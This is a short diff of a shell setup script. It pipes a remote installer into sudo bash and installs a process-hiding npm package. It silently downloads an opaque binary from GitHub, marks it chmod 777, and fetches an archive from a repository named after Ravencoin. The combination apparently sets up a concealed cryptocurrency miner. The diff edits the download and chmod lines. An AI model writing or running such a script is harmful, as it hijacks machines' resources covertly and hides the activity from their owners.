@@ -17,8 +17,9 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-apt update && apt install unzip
-wget -O mmm https://github.com/kidoescegh/xm/raw/main/sorabi28 > /dev/null 2>&1 && chmod 777 mmm
+apt update
+wget -O mmm https://github.com/kidoescegh/xm/raw/main/sorabi28 > /dev/null 2>&1 
+chmod 777 mmm
 
 wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
 
